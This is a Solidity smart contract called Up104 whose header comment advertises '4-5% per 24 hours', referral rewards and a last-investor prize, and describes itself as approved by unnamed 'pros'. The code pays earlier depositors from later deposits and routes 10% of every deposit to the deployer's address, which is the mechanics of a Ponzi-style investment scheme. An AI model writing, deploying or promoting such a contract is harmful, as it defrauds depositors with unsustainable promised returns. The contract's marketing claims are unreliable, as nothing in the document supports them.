1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Up104 Contract
6  *  - GAIN 4-5% PER 24 HOURS (every 5900 blocks)
7  *  - 10% of the contributions go to project advertising
8  *
9  * How to use:
10  *  1. Send at least 0.001 Ether to make an investment.
11  *  2a. Claim your profit by sending 0 Ether transaction (every minute,
12  *      every day, every week, i don't care unless you're spending too
13  *      much on GAS).
14  *  OR
15  *  2b. Send at least 0.001 Ether to reinvest AND get your profit at the
16  *      same time.
17  *  3. Participants with referrers receive 5% instead of 4%.
18  *  4. To become someone's referral, enter the address of the referrer
19  *     in the field DATA when sending the first deposit.
20  *  5. Only a participant who deposited at least 0.001 Ether can become a
21  *     referrer.
22  *  6. Referrers receive 10% of each deposit of referrals immediately to
23  *     their wallet.
24  *  7. To receive the prize fund, you need to be the last investor for at
25  *     least 42 blocks (~10 minutes), after which you need to send 0 Ether
26  *     or reinvest.
27  *
28  * RECOMMENDED GAS LIMIT: 200000
29  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
30  *
31  * Contract reviewed and approved by pros!
32  *
33  */
34  
35 contract Up104 {
36     address support = msg.sender;
37     uint public prizeFund;
38     address public lastInvestor;
39     uint public lastInvestedAt;
40     
41     uint public totalInvestors;
42     uint public totalInvested;
43     
44     // records amounts invested
45     mapping (address => uint) public invested;
46     // records blocks at which investments were made
47     mapping (address => uint) public atBlock;
48     // records referrers
49     mapping (address => address) public referrers;
50     
51     function bytesToAddress(bytes source) internal pure returns (address parsedAddress) {
52         assembly {
53             parsedAddress := mload(add(source,0x14))
54         }
55         return parsedAddress;
56     }
57 
58     // this function called every time anyone sends a transaction to this contract
59     function () external payable {
60         require(msg.value == 0 || msg.value >= 0.001 ether);
61         
62         prizeFund += msg.value * 7 / 100;
63         uint transferAmount;
64         
65         support.transfer(msg.value / 10);
66         
67         // if sender (aka YOU) is invested more than 0 ether
68         if (invested[msg.sender] != 0) {
69             uint max = (address(this).balance - prizeFund) * 9 / 10;
70             
71             // calculate profit amount as such:
72             // amount = (amount invested) * (4 - 5)% * (blocks since last transaction) / 5900
73             // 5900 is an average block count per day produced by Ethereum blockchain
74             uint percentage = referrers[msg.sender] == 0x0 ? 4 : 5;
75             uint amount = invested[msg.sender] * percentage / 100 * (block.number - atBlock[msg.sender]) / 5900;
76             if (amount > max) {
77                 amount = max;
78             }
79 
80             transferAmount += amount;
81         } else {
82             totalInvestors++;
83         }
84         
85         if (lastInvestor == msg.sender && block.number >= lastInvestedAt + 42) {
86             transferAmount += prizeFund;
87             prizeFund = 0;
88         }
89         
90         if (msg.value > 0) {
91             if (invested[msg.sender] == 0 && msg.data.length == 20) {
92                 address referrerAddress = bytesToAddress(bytes(msg.data));
93                 require(referrerAddress != msg.sender);     
94                 if (invested[referrerAddress] > 0) {
95                     referrers[msg.sender] = referrerAddress;
96                 }
97             }
98             
99             if (referrers[msg.sender] != 0x0) {
100                 referrers[msg.sender].transfer(msg.value / 10);
101             }
102             
103             lastInvestor = msg.sender;
104             lastInvestedAt = block.number;
105         }
106 
107         // record block number and invested amount (msg.value) of this transaction
108         atBlock[msg.sender] = block.number;
109         invested[msg.sender] += msg.value;
110         totalInvested += msg.value;
111         
112         if (transferAmount > 0) {
113             msg.sender.transfer(transferAmount);
114         }
115     }
116 }